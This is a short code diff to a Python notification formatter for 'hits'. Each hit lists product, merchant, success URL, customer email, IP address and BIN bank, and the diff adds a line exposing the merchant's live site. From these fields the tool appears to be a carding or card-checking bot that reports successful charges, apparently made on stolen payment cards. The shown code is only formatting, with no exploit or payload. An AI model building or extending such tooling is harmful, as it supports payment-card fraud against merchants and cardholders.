@@ -79,7 +79,7 @@ def clean_response(raw) -> str:
         if ident:
             return str(ident)
         return "OK"
-    return s[:157] + "..." if len(s) > 160 else s
+    return s[:297] + "..." if len(s) > 300 else s
 
 
 def _mask_success_url(url: Optional[str]) -> str:
@@ -150,6 +150,9 @@ def format_hit(hit: dict, user: dict, admin_view: bool = False) -> str:
 
     product = hit.get("product") or "—"
     merchant = hit.get("merchant") or "—"
+    # v2.9.1: the live site URL was missing from notifications when success_url
+    # was empty (most gateways) — always show the merchant site/host explicitly.
+    site = hit.get("site_url") or hit.get("hostname") or "—"
     success = _mask_success_url(hit.get("success_url"))
     email = hit.get("customer_email") or "—"
     ip_addr = hit.get("ip") or "—"
@@ -160,6 +163,7 @@ def format_hit(hit: dict, user: dict, admin_view: bool = False) -> str:
         return (v[:n - 3] + "...") if isinstance(v, str) and len(v) > n else v
     product = _cap(product, 80)
     merchant = _cap(merchant, 80)
+    site = _cap(site, 100)
     email = _cap(email, 80)
     bin_bank = _cap(bin_bank, 80)
 
@@ -210,6 +214,7 @@ def format_hit(hit: dict, user: dict, admin_view: bool = False) -> str:
         f"- - - - - - - - - - - - - - - - - - - - - -\n"
         f"⚜️Product ➔ {_esc(product)}\n"
         f"⚜️Merchant ➔ {_esc(merchant)}\n"
+        f"⚜️Site ➔ {_esc(site)}\n"
         f"{invoice_line}"
         f"⚜️Success URL ➔ {success}\n"
         f"⚜️Customer Email ➔ <code>{_esc(email)}</code>\n"
